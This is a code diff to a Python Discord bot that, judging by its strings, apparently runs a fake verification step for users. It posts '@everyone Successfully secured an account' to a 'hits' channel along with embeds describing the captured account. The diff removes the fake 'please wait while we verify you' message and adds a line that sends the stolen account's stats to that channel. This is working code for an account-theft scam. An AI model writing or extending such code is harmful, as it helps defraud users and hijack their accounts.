@@ -39,14 +39,6 @@ class MyModalOne(ui.Modal):
 
         await interaction.response.defer(ephemeral=True)
 
-        await interaction.followup.send(
-            embed = discord.Embed(
-                description = "⌛ Please wait while we try to verify you...",
-                color = 0xDE755B
-            ),
-            ephemeral = True
-        )
-        
         logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
@@ -190,6 +182,7 @@ class MyModalOne(ui.Modal):
                         return
                     
                     await hits_channel.send("@everyone **Successfully secured an account**")
+                    await hits_channel.send(embed = securedAccount["stats_embed"])
                     await hits_channel.send(
                         embed = securedAccount["hit_embed"],
                         view = accountInfo(
